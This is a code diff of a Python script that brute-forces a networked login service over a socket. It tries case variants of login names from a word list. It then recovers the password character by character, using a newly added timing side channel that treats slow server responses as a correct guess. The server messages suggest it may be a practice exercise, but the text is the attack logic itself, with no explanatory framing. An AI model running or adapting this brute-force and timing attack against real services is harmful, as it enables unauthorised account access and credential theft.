@@ -3,6 +3,7 @@ import socket
 import string
 import itertools
 import json
+import datetime
 my_socket = socket.socket()
 
 
@@ -33,7 +34,7 @@ def get_response():
     for line in f:
         for login in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n')))):
             password = ' '
-            json_sent = {} #{"login": login, "password": password}
+            json_sent = {}
             json_sent["login"] = login
             json_sent["password"] = password
             my_socket.send(json.dumps(json_sent).encode())
@@ -43,6 +44,7 @@ def get_response():
                 f.close()
                 return correct_login
 
+# if login we found is correct, then we could find a password
 def get_password(must_be_correct_login):
     passw = ""
     while True:
@@ -52,16 +54,18 @@ def get_password(must_be_correct_login):
             json_sent["login"] = must_be_correct_login
             json_sent["password"] = passw
             my_socket.send(json.dumps(json_sent).encode(encoding='utf-8'))
+            date_sent = datetime.datetime.now()
             response = json.loads(my_socket.recv(1024).decode(encoding='utf-8'))
-            if response["result"] == "Exception happened during login":
+            date_response = datetime.datetime.now()
+            date_delta = (date_response - date_sent).microseconds
+            if date_delta >= 90000 or response["result"] == "Exception happened during login":
                 continue
-            elif response["result"] == "Wrong password!":
+            elif response["result"] == "Wrong password!" and date_delta < 90000:
                 passw = passw[:-1]
                 continue
             elif response["result"] == "Connection success!":
                 return passw
-            elif response["result"] == "Wrong login!":
-                return "even more fuck"
+
 
 
 def get_final_json():
